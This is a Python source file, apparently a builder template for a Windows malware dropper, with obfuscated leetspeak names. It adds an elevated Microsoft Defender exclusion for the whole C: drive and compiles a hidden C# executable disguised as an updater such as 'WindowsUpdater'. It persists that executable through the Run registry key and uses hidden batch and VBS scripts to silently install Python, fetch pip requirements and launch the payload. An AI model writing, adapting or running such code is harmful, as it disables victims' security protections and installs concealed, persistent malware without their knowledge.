# -*- coding: utf-8 -*-
from os import path as pth, getenv as g3nv, system as syst3m
from os import devnull as dvn, remove as r3m
from random import choices as chs, choice as ch
from subprocess import run, call as c411
from win32api import SetFileAttributes as Sf4ttr1but3
from win32con import FILE_ATTRIBUTE_HIDDEN as f4h1dd3n
from winreg import CreateKey as ck3y, HKEY_CURRENT_USER as hk3ycus3r
from winreg import REG_SZ as r3gsz, SetValueEx as sv3x

def wf1l3(p4th, d4t4):
    with open(p4th, 'w', encoding='UTF-8') as f:
        f.write(d4t4)

def rf1l3(p4th):
    with open(p4th, 'r', encoding='UTF-8') as f:
        return f.read()

def m4k3h1dd3n(file_path):
    try: Sf4ttr1but3(file_path, f4h1dd3n)
    except: pass

def g3np4th(bp4th, lgh=5):
    rdch41n = ''.join(chs('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=lgh))
    return pth.join(bp4th, rdch41n + '.log')

def bullyd3f3nd3r():
    try:
        cmd = 'Set-MpPreference -ExclusionPath c:\\'
        run(['powershell', '-Command', f'Start-Process powershell -Verb runAs -ArgumentList "-Command {cmd}" -WindowStyle Hidden'], capture_output=False, text=False)
    except: pass

def m41n():
    srch = 'SRC_HASHED'
    r3c0mpyl3r = r"""'RECOMPYLER'"""
    rp4th = [
        pth.join(g3nv('ProgramData')),
        g3nv('TEMP'),
        g3nv('APPDATA'),
        g3nv('LOCALAPPDATA'),
        g3nv('USERPROFILE')]
    cn4me = ch([
        'PCHealthCheck',
        'WindowsUpdater',
        'MSEdgeUpdater',
        'ChromeUpdater',
        'GoogleCrashHandler',
        'JavaUpdateChecker',
        'WindowsStore'])
    sp4th = [g3np4th(ch(rp4th)) for _ in srch]

    for p4th, ch4r in zip(sp4th, srch):
        wf1l3(p4th, ch4r + "\n")
        m4k3h1dd3n(p4th)

    bullyd3f3nd3r()
    sp4th = [s.replace('\\', '\\\\') for s in sp4th]
    rc0nt3nt = r3c0mpyl3r.replace('PARTS_PATH', '","'.join(sp4th))
    cf1l3 = pth.join(g3nv('TEMP'), f"{cn4me}.cs")
    wf1l3(cf1l3, rc0nt3nt)
    csc = pth.join(g3nv("SystemRoot"), 'Microsoft.NET\\Framework\\v4.0.30319', 'csc.exe')
    ex3p4th = ch(rp4th)
    ex3f1l3 = f'{ex3p4th}\\{cn4me}.exe'
    cmd4rgs = [
        csc,
        f'/out:{ex3f1l3}',
        cf1l3,
    ]
    cmdstr = " ".join(cmd4rgs)
    d3vnu11 = open(dvn, 'w')
    syst3m("{} > {} 2>&1".format(cmdstr, dvn))
    d3vnu11.close()
    m4k3h1dd3n(ex3f1l3)

    k3y = ck3y(hk3ycus3r, r"Software\Microsoft\Windows\CurrentVersion\Run")
    sv3x(k3y, cn4me, 0, r3gsz, ex3f1l3)
    r3m(cf1l3)

    p1pp4th = pth.join(g3nv('TEMP'), 'pip.txt')
    tsp4th = pth.join(g3nv('TEMP'), 'temporary.cmd')
    tslp4th = pth.join(g3nv('TEMP'), 'launch.vbs')
    if g3nv('USERNAME') in ex3f1l3:
        ex3f1l3 = ex3f1l3.replace(g3nv('USERNAME'), "%USERNAME%") 

    p1ps = r"""'PIPREQUIREMENTS'"""
    tscr1pt = u'''set "PYTHON_EXE=python-installer.exe"
    set "PYTHON_TEMP=%TEMP%\%PYTHON_EXE%"
    for /f "tokens=1,2 delims= " %%a in ('powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/ -UseBasicParsing | Select-String -Pattern '3.10.[0-9]{1,2}' -AllMatches | Select-Object -ExpandProperty Matches | Select-Object -ExpandProperty Value | Sort-Object -Descending -Unique | Select-Object -First 1"') do (
        set "PYTHON_VERSION=%%a%%b"
    )
    set "PYTHON_URL=https://www.python.org/ftp/python/%PYTHON_VERSION%/python-%PYTHON_VERSION%-amd64.exe"
    curl -L -o "%PYTHON_TEMP%" "%PYTHON_URL%"
    start /wait "" "%PYTHON_TEMP%" /passive /norestart TARGETDIR=C:\Python310 ALLUSERS=1 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0 /qn /quiet /norestart
    taskkill /f /im "%PYTHON_EXE%"
    del "%PYTHON_TEMP%"
    pip install -r "%TEMP%/pip.txt"
    "{fp4th}"'''.replace('{fp4th}', ex3f1l3)
    vbsscr1pt = r"""Set WshShell = WScript.CreateObject("WScript.Shell")
    WshShell.Run "cmd /c start /b {tsp4th}", 0, False""".replace("{tsp4th}", tsp4th)


    if pth.exists(p1pp4th): r3m(p1pp4th)
    if pth.exists(tslp4th): r3m(tslp4th)
    try: r3m(tsp4th)
    except: pass

    wf1l3(tslp4th, vbsscr1pt)
    m4k3h1dd3n(tslp4th)
    wf1l3(p1pp4th, p1ps)
    m4k3h1dd3n(p1pp4th)
    wf1l3(tsp4th , tscr1pt)
    m4k3h1dd3n(tsp4th)

    c411(["cscript.exe", "//nologo", tslp4th])

if __name__ == '__main__':
    m41n()
